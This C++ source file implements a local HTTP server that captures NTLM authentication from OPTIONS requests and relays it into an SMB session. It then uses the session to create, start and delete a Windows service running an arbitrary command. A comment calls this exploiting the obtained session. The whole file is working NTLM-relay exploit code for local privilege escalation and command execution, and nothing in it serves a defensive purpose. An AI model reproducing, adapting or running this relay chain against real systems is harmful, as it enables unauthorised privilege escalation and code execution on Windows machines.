#include "stdafx.h"

#include <atlenc.h>

HttpServer::HttpServer()
{
	RtlZeroMemory(_request, sizeof(_request));
	_firstAuth = true;
	_endSession = false;
}

void HttpServer::run()
{
	WSAData wsadata;
	if (WSAStartup(MAKEWORD(2, 2), &wsadata) != NO_ERROR){
		cout << "Error at WSAStartup\n";
		return;
	}

	SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (listenSocket == INVALID_SOCKET){
		cout << "Error opening socket: " << WSAGetLastError() << endl;
		WSACleanup();
		return;
	}

	sockaddr_in serverService;
	serverService.sin_family = AF_INET;
	serverService.sin_addr.s_addr = inet_addr("127.0.0.1");
	serverService.sin_port = htons(LISTEN_PORT);
	if (bind(listenSocket, (SOCKADDR*)&serverService, sizeof(serverService)) == SOCKET_ERROR){
		cout << "Error at bind: " << WSAGetLastError() << endl;
		closesocket(listenSocket);
		WSACleanup();
		return;
	}

	if (listen(listenSocket, BACKLOG) == SOCKET_ERROR){
		cout << "Error at listen: " << WSAGetLastError() << endl;
		closesocket(listenSocket);
		WSACleanup();
		return;
	}
	cout << "Server listening." << endl;
	while (true){

		struct sockaddr_in from;
		int fromLen = sizeof(from);
		_client = accept(listenSocket, (struct sockaddr*)&from, &fromLen);
		if (_client == INVALID_SOCKET){
			cout << "Error at accept: " << WSAGetLastError() << endl;
			closesocket(listenSocket);
			WSACleanup();
			return;
		}

		int bytesRecv = 0; //receive from client
		bytesRecv = recv(_client, _request, HTTP_BUFF_SIZE, 0);
		if (bytesRecv == SOCKET_ERROR){
			cout << "Server, error at recv() " << WSAGetLastError() << endl;
			closesocket(listenSocket);
			WSACleanup();
			return;
		}
		_request[bytesRecv] = '\0';

		handleRequest();
		
		closesocket(_client);
		if (_endSession) break;
	}
	closesocket(listenSocket);
	WSACleanup();
	doSMBStuff(); // Exploit the obtained SMB session
	return;
}

void HttpServer::handleRequest()
{
	cout << _request << endl;
	string res = string(_request).substr(0, (string(_request)).find(" "));

	if (res.compare("OPTIONS") == 0)
		handleOptionRequest();
	else
	{
		char sendBuff[HTTP_BUFF_SIZE];
		int bytesSent = 0;

		//send response to client
		sprintf_s(sendBuff, "%s\n", HTTP_OK);
		send(_client, sendBuff, (int)strlen(sendBuff), 0);
		cout << sendBuff << endl;
	}
}


void HttpServer::handleOptionRequest()
{
	char sendBuff[HTTP_BUFF_SIZE];
	int bytesSent = 0;

	int inx = string(_request).find("Authorization: NTLM ");
	if (inx == string::npos) { // first connect
		sprintf_s(sendBuff, "%s\n%s\n\n", HTTP_UNAUTHORIZED, HTTP_AUTHENTICATE);
		_smb_con.DoConnect();
		_smb_con.NegotiateExchange();
	}
	else {
		int enx = (string(_request).substr(inx)).find("\r\n");
		strcpy_s(_ntlmblock, string(_request).substr(inx + 20, enx - 20).c_str());
		if (!_firstAuth) { // type 3 msg
			BYTE type3[4096] = { 0 };
			int len = sizeof(type3);

			Base64Decode(_ntlmblock, strlen(_ntlmblock), type3, &len);
			char result[4096];
			_smb_con.SessionSetupExchange((char*)type3, len, result);

			sprintf_s(sendBuff, "%s\n\n", HTTP_OK);
			_endSession = true;
		}
		else { // type 1 msg
			BYTE type1[4096] = { 0 };
			int len = sizeof(type1);

			Base64Decode(_ntlmblock, strlen(_ntlmblock), type1, &len);
			char type2bMsg[4096] = { 0 };
			char type2Msg[4096] = { 0 };
			int byteCount = _smb_con.SessionSetupExchange((char*)type1, len, type2bMsg);

			len = byteCount * 2;
			Base64Encode((byte*)type2bMsg, byteCount, type2Msg, &len, ATL_BASE64_FLAG_NOCRLF);

			sprintf_s(sendBuff, "%s\n%s %s\n\n", HTTP_UNAUTHORIZED, HTTP_AUTHENTICATE, type2Msg);
			_firstAuth = false;
		}
	}

	send(_client, sendBuff, (int)strlen(sendBuff), 0);
	cout << sendBuff << endl;
}

void HttpServer::doSMBStuff() {
	_smb_con.TreeConnectExchange();
	_smb_con.NTCreateExchange();
	
	_smb_con.TransDCERPC();
	_smb_con.OpenSCManagerW();
	_smb_con.OpenServiceW();

	_smb_con.CreateServiceW(_cmd);
	_smb_con.StartServiceW();
	_smb_con.DeleteService();
}
